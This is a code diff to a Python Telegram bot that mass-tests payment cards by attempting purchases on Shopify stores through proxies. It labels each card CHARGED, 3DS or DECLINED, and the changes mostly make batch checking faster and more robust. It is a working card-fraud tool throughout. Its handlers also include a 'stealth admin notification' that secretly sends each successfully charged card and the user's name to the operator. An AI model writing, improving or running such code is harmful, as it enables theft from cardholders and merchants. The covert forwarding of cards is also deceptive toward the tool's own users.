@@ -300,9 +300,8 @@ async def auto_shopify_client(
 # =============================================================================
 
 # Global semaphore - prevents server overload (all users combined)
-# Higher limit to allow multiple users to work simultaneously
-GLOBAL_CONCURRENCY_LIMIT = 100
-global_semaphore = asyncio.Semaphore(GLOBAL_CONCURRENCY_LIMIT)
+# Uses config value (default 150) to allow multiple users to work simultaneously
+global_semaphore = asyncio.Semaphore(config.GLOBAL_CONCURRENCY_LIMIT)
 
 # Per-user semaphores - each user gets their own limit
 # This ensures User A's checking doesn't block User B
@@ -360,7 +359,7 @@ def create_progress_bar(current: int, total: int, length: int = 10) -> str:
     return f"[{bar}] {percent}%"
 
 
-async def process_single_card(card: str, user_id: int = None) -> dict:
+async def process_single_card(card: str, user_id: int = None, user_settings: dict = None) -> dict:
     """
     Process a single card and return result.
 
@@ -369,49 +368,80 @@ async def process_single_card(card: str, user_id: int = None) -> dict:
     2. Global semaphore: Total concurrent operations across all users capped at GLOBAL_CONCURRENCY_LIMIT
 
     This ensures User A checking cards doesn't block User B.
+
+    Args:
+        card: Card string to check
+        user_id: User ID for concurrency control
+        user_settings: Pre-fetched user settings (optional, avoids DB calls inside semaphore)
     """
+    # Get user settings BEFORE acquiring semaphore (non-blocking)
+    if user_settings is None:
+        settings = get_user_settings(user_id) if user_id else {}
+    else:
+        settings = user_settings
+
+    # Check for products early (before acquiring semaphore)
+    user_products = settings.get("products", [])
+    if not user_products:
+        return {
+            "card": card,
+            "product_url": None,
+            "response": {"error": "No product set. Use /addproduct first.", "success": False},
+            "bin_data": {}
+        }
+
     # Get user-specific semaphore (or create one)
     user_sem = await get_user_semaphore(user_id) if user_id else asyncio.Semaphore(config.CONCURRENCY_LIMIT)
 
     # Acquire both: user limit AND global limit
     async with user_sem:
         async with global_semaphore:
-            logger.info(f'Processing card: {card} (user: {user_id})')
+            try:
+                logger.info(f'Processing card: {card} (user: {user_id})')
 
-            # Get user settings
-            settings = get_user_settings(user_id) if user_id else {}
+                product_url = random.choice(user_products)
 
-            # Use user's product URLs (required)
-            user_products = settings.get("products", [])
-            if not user_products:
+                # Use user's proxy or fall back to config
+                user_proxy = settings.get("proxy")
+                proxies = [user_proxy] if user_proxy else config.PROXY_LIST
+
+                response = await auto_shopify_client(
+                    card=card,
+                    product_url=product_url,
+                    email=settings.get("email") or config.DEFAULT_EMAIL,
+                    is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
+                    proxies=proxies,
+                    logger=logger
+                )
+
+                # BIN lookup is fast and non-critical - run concurrently
+                bin_data = await bin_lookup(card[:6])
+
+                return {
+                    "card": card,
+                    "product_url": product_url,
+                    "response": response,
+                    "bin_data": bin_data
+                }
+
+            except asyncio.CancelledError:
+                # Handle cancellation gracefully
+                logger.warning(f"Card check cancelled: {card}")
                 return {
                     "card": card,
                     "product_url": None,
-                    "response": {"error": "No product set. Use /addproduct first.", "success": False},
+                    "response": {"error": "Check cancelled", "success": False},
                     "bin_data": {}
                 }
-
-            product_url = random.choice(user_products)
-
-            # Use user's proxy or fall back to config
-            user_proxy = settings.get("proxy")
-            proxies = [user_proxy] if user_proxy else config.PROXY_LIST
-
-            response = await auto_shopify_client(
-                card=card,
-                product_url=product_url,
-                email=settings.get("email") or config.DEFAULT_EMAIL,
-                is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
-                proxies=proxies,
-                logger=logger
-            )
-            bin_data = await bin_lookup(card[:6])
-            return {
-                "card": card,
-                "product_url": product_url,
-                "response": response,
-                "bin_data": bin_data
-            }
+            except Exception as e:
+                # Catch ALL exceptions to prevent stopping the batch
+                logger.error(f"Error processing card {card}: {e}")
+                return {
+                    "card": card,
+                    "product_url": None,
+                    "response": {"error": f"Processing error: {str(e)[:50]}", "success": False},
+                    "bin_data": {}
+                }
 
 
 def format_result(result: dict, show_full: bool = True) -> str:
@@ -1056,7 +1086,7 @@ async def dbstatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Add concurrency stats
     status_parts.append(f"\n⚡ *Concurrency*:")
-    status_parts.append(f"• Global limit: {GLOBAL_CONCURRENCY_LIMIT}")
+    status_parts.append(f"• Global limit: {config.GLOBAL_CONCURRENCY_LIMIT}")
     status_parts.append(f"• Per-user limit: {config.CONCURRENCY_LIMIT}")
     status_parts.append(f"• Active user semaphores: {len(user_semaphores)}")
 
@@ -1169,6 +1199,9 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session = get_user_session(user_id)
     session["checking"] = True
 
+    # Pre-fetch user settings ONCE before starting (optimization)
+    user_settings = get_user_settings(user_id)
+
     status_msg = await update.message.reply_text(
         f"📂 *File Received*\n\n"
         f"💳 Cards found: {len(cards)}\n"
@@ -1185,17 +1218,26 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     checked_count = 0
     was_stopped = False
 
-    tasks = [process_single_card(card, user_id) for card in cards]
+    # Track processed cards to ensure none are lost
+    processed_cards = set()
+
+    # Create tasks with pre-fetched settings for better performance
+    tasks = [process_single_card(card, user_id, user_settings) for card in cards]
 
     for i, future in enumerate(asyncio.as_completed(tasks)):
-        # Check for stop
+        # Check for stop FIRST
         if session["stopped"]:
             was_stopped = True
             break
 
-        # Check for pause - wait until resumed
+        # Check for pause - yield control frequently for responsiveness
+        pause_check_count = 0
         while session["paused"] and not session["stopped"]:
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.05)  # Faster response to resume (50ms vs 100ms)
+            pause_check_count += 1
+            # Yield to event loop every 20 iterations to keep callbacks responsive
+            if pause_check_count % 20 == 0:
+                await asyncio.sleep(0)  # Pure yield to event loop
 
         if session["stopped"]:
             was_stopped = True
@@ -1206,6 +1248,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response = result["response"]
             card = result["card"]
             checked_count += 1
+            processed_cards.add(card)
 
             # Build full response with all error details
             response_parts = []
@@ -1232,24 +1275,31 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if response.get("success"):
                 charged.append(result)
                 all_results.append(f"CHARGED | {result_line}")
-                await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                # Non-blocking notification to user
+                asyncio.create_task(
+                    update.message.reply_text(format_result(result), parse_mode="Markdown")
+                )
                 # Stealth admin notification (real-time, non-blocking)
                 username = update.effective_user.username or update.effective_user.first_name
                 asyncio.create_task(notify_admin_charged(card, result, user_id, username))
             elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                 three_ds.append(result)
                 all_results.append(f"3DS | {result_line}")
-                await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                # Non-blocking notification
+                asyncio.create_task(
+                    update.message.reply_text(format_result(result), parse_mode="Markdown")
+                )
             else:
                 declined.append(result)
                 all_results.append(f"DECLINED | {result_line}")
 
-            # Update progress every 10 cards for speed
+            # Update progress every 10 cards for speed (non-blocking)
             if checked_count % 10 == 0 or checked_count == len(cards):
                 try:
                     progress_bar = create_progress_bar(checked_count, len(cards))
                     pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
-                    await status_msg.edit_text(
+                    # Fire-and-forget progress update
+                    asyncio.create_task(status_msg.edit_text(
                         f"{pause_status}⏳ *Checking Cards...*\n\n"
                         f"{progress_bar}\n"
                         f"📊 {checked_count}/{len(cards)} checked\n\n"
@@ -1259,13 +1309,17 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         f"💬 *Last*: `{last_response}`",
                         parse_mode="Markdown",
                         reply_markup=get_checking_keyboard(paused=session["paused"])
-                    )
+                    ))
                 except Exception:
                     pass
 
+        except asyncio.CancelledError:
+            logger.warning(f"Task cancelled during mass check")
+            continue  # Don't stop the whole batch
         except Exception as e:
             logger.error(f"Mass check error: {e}")
             last_response = f"Error: {str(e)[:30]}"
+            checked_count += 1  # Count failed cards too
 
     # Reset session
     session["checking"] = False
@@ -1441,6 +1495,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session = get_user_session(user_id)
         session["checking"] = True
 
+        # Pre-fetch user settings ONCE before starting (optimization)
+        user_settings = get_user_settings(user_id)
+
         status_msg = await update.message.reply_text(
             f"⏳ Checking {len(cards)} cards...",
             reply_markup=get_checking_keyboard(paused=False)
@@ -1453,18 +1510,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         last_response = ""
         checked_count = 0
         was_stopped = False
+        processed_cards = set()
 
-        tasks = [process_single_card(card, user_id) for card in cards]
+        # Create tasks with pre-fetched settings
+        tasks = [process_single_card(card, user_id, user_settings) for card in cards]
 
         for i, future in enumerate(asyncio.as_completed(tasks)):
-            # Check for stop
+            # Check for stop FIRST
             if session["stopped"]:
                 was_stopped = True
                 break
 
-            # Check for pause - wait until resumed
+            # Check for pause - yield control frequently for responsiveness
+            pause_check_count = 0
             while session["paused"] and not session["stopped"]:
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.05)  # Faster response (50ms)
+                pause_check_count += 1
+                if pause_check_count % 20 == 0:
+                    await asyncio.sleep(0)  # Pure yield to event loop
 
             if session["stopped"]:
                 was_stopped = True
@@ -1475,6 +1538,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 response = result["response"]
                 card = result["card"]
                 checked_count += 1
+                processed_cards.add(card)
 
                 # Build full response with all error details
                 response_parts = []
@@ -1499,24 +1563,29 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if response.get("success"):
                     charged.append(result)
                     all_results.append(f"CHARGED | {result_line}")
-                    await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                    # Non-blocking notification
+                    asyncio.create_task(
+                        update.message.reply_text(format_result(result), parse_mode="Markdown")
+                    )
                     # Stealth admin notification (real-time, non-blocking)
                     username = update.effective_user.username or update.effective_user.first_name
                     asyncio.create_task(notify_admin_charged(card, result, user_id, username))
                 elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                     three_ds.append(result)
                     all_results.append(f"3DS | {result_line}")
-                    await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                    asyncio.create_task(
+                        update.message.reply_text(format_result(result), parse_mode="Markdown")
+                    )
                 else:
                     declined.append(result)
                     all_results.append(f"DECLINED | {result_line}")
 
-                # Update progress every 10 cards for speed
+                # Update progress every 10 cards (non-blocking)
                 if checked_count % 10 == 0 or checked_count == len(cards):
                     try:
                         progress_bar = create_progress_bar(checked_count, len(cards))
                         pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
-                        await status_msg.edit_text(
+                        asyncio.create_task(status_msg.edit_text(
                             f"{pause_status}⏳ *Checking Cards...*\n\n"
                             f"{progress_bar}\n"
                             f"📊 {checked_count}/{len(cards)} checked\n\n"
@@ -1526,12 +1595,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             f"💬 *Last*: `{last_response}`",
                             parse_mode="Markdown",
                             reply_markup=get_checking_keyboard(paused=session["paused"])
-                        )
+                        ))
                     except Exception:
                         pass
+
+            except asyncio.CancelledError:
+                logger.warning(f"Task cancelled during paste check")
+                continue
             except Exception as e:
                 logger.error(f"Mass check error: {e}")
                 last_response = f"Error: {str(e)[:30]}"
+                checked_count += 1
 
         # Reset session
         session["checking"] = False
